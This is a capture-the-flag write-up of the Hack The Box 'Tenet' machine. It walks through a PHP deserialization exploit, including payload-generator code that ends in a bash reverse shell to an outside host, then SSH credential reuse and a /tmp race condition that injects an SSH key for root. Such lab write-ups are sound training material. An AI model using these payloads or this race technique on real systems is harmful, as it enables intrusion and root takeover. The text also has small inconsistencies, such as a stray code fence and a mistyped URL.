# Summary
Tenet is a ctf like medium linux machine. It requires creative thinking and some guessing to obtain foothold on the machine. We begin by finding hidden wordpress blog. There is a comment in one of the blogs that gives out a hint for a subdomain and a php script source code. Upon looking at the php script source code, we see the script is vulnerable to php object deserialization.

```
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu Bionic.
The website on port 80 is hosting the default apache page.

## Webserver - TCP 80
I started to fuzz the page to look for any hidden hostname and subdomains. 

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/boxes/tenet]
â””â”€# gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -q
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.223/wordpress/]

```
Gobuster found wordpress directory which then revealed hostname ```tenet.htb```
![](/assets/img/htb-tenet/2021-05-29-14-08-49.png)
After updating ```/etc/hosts``` file, it loaded a wordpress blog page.
We can use ```wpscan``` tool to enumerate for users, outdated and vulnerable plugins, themes and much more.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/boxes/tenet]
â””â”€# wpscan --url http://tenet.htb/ -e ap,t,tt,u
...[snip]...
[i] User(s) Identified:

[+] protagonist
 | Found By: Author Posts - Author Pattern (Passive Detection)
...[snip]...

[+] neil
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

...[snip]...
```
Wpscan revealed two users ```admin, protagonist```. 
There is a comment left on one of the blogs that said:
```text
did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
```
![](/assets/img/htb-tenet/2021-05-29-14-21-03.png)
The comment hints that there is a php script and a backup with the name ```sator``` somewhere in the server. So I started to fuzz for it.
After fuzzing around, I found a valid subdomain ```sator.tenet.htb``` which loads the default apache page.
![](//assets/img/htb-tenet/2021-05-29-14-29-09.png)
I also found the sator php script at ```http://sator.tenet.htb/sator.php```.
 
![](//assets/img/htb-tenet/htb-tenet/2021-05-29-14-46-13.png)
The php script ```sator.php``` seems to get users from users file and update database.
Going back to the comment on the blog post, the hint also included a backup for the same script. I added ```.bak``` and downloaded the source code of the ```sator.php``` script.
![](/assets/img/htb-tenet/2021-05-29-14-55-47.png)

Below was the content of ```sator.php``` script:

```php
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>
````
The script takes the variable ```arepo``` through GET method, unserializes it and passes it to the class ```DatabaseExport```.

The  ```__destruct()``` uses ```file_put_contents``` to write the content of the file ```user_file``` to the web root directory.

# RCE

We can abuse this by:
- creating a serialized php script.
- the php script would specify 2 variales ```user_file``` as a php script and ```data``` as the code we want to execute on the target machine.
- Then we browse to the ```user_file``` we specified to execute our code.

The code to create the serialized payload is

```php
<?php

class DatabaseExport {
    public $user_file = 'evil.php';
    public $data = '<?php exec("ping -c 2 10.10.14.59"); ?>';
}
print urlencode(serialize(new DatabaseExport))
?>
```
I used ping as my payload to test if the code works on the target. 
I executed the above php script and copied the output. The output is then passed on to ```http://sator.tenet.php?arepo=```. 
![](/assets/img/htb-tenet/2021-05-29-20-18-26.png)
In the screenshot above, we see that the target is able to ping back to our kali machine.

## Foothold
Since the ping command worked, I replaced the ping with a reverse shell as shown below.

```php
<?php
class DatabaseExport {
    public $user_file = 'evil.php';
    public $data = '<?php exec("bash -i >& /dev/tcp/10.10.14.59/9001 0>&1"); ?>';
}
print urlencode(serialize(new DatabaseExport))
?>
```

## User Privilege Escelation
I know wordpress has credentials specified in the file ```wp-config.php``` 
The credentials in the wordpress config file were reused as ssh password.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/boxes/tenet]
â””â”€# ssh neil@tenet.htb                                                                                                       130 â¨¯
neil@tenet.htb password: 
Last login: Fri May 28 22:13:37 2021 from 10.10.14.59
neil@tenet:~$ id
uid=1001(neil) gid=1001(neil) groups=1001(neil)
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```
```sudo -l``` reveals that user neil can run ```/usr/local/bin/enableSSH.sh``` with sudo privilege. 

When ```enableSSH.sh``` is executed with ```sudo``` it prints:

```bash
neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh 
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:~$
```
Below was the content of the script. I commented what each line does to understand the script better.
```bash
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3) 
        # variable sshName is echoing variable key, separating on space and grabbing the 3rd index

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
        # if the variable sshName does not exist in /root/.ssh/authorized_keys

                /bin/echo "Successfully added $sshName to authorized_keys file!"
                #then echo "successfully....." 

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"
                # echo error
        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
        # if file exists and size is greater than 0, and is also regular file

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi
                # if file is regular file then remove it
                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        # variable tmpName creates temporary file ssh-XXXXXXXX
        (umask 110; touch $tmpName)
        # set permissions
        /bin/echo $key >>$tmpName
        # copy variable key to variable tmpName
        checkFile $tmpName
        # check if tmpName exists
        /bin/cat $tmpName >>/root/.ssh/authorized_keys
        # copy tmpName to authorized_keys
        /bin/rm $tmpName
        # then remove the file tmpName
}

key="ssh-rsa AAAAA3NzaG1yc..............root@ubuntu" # sample ssh public key
addKey # invoking the function addKey
checkAdded # invoking the function checkAdded

```

## Root Privilege Escelation
The user ```neil``` is able to execute the bash script ```/usr/local/bin/enableSSH.sh``` as superuser. The bash script is getting ssh public key from a random generated file stored in ```/tmp/``` directory and adds it to ```/root/.ssh/authorized_keys```. The random file name starts with ```ssh-```.

We can take advatage of this by writing a script which copies our own public ssh key to any file with name ```ssh-****``` stored in ```/tmp/``` directory. 
First i created ssh keys pair specific for this with the command:
```bash
ssh-keygen -f root
```
After creating the ssh keys, copy the public key inside the echo quotes
I wrote below bash script:
```bash
#!/bin/bash
while :
do 
echo "ssh-rsa AAAAB3NzaC1yc2EAAA............root@kali" | tee /tmp/ssh-* 2>/dev/null
done
```

The script would run in a loop and echo our public key to any files in ```/tmp/ssh-*``` which would then be copied to ```/root/.ssh/authorized_keys```.

We first execute the our bash script, then execute the command ```sudo /usr/local/bin/enableSSH.sh```.

Finally we ssh to root using the command ```ssh -i <ssh private key> root@10.10.10.223```
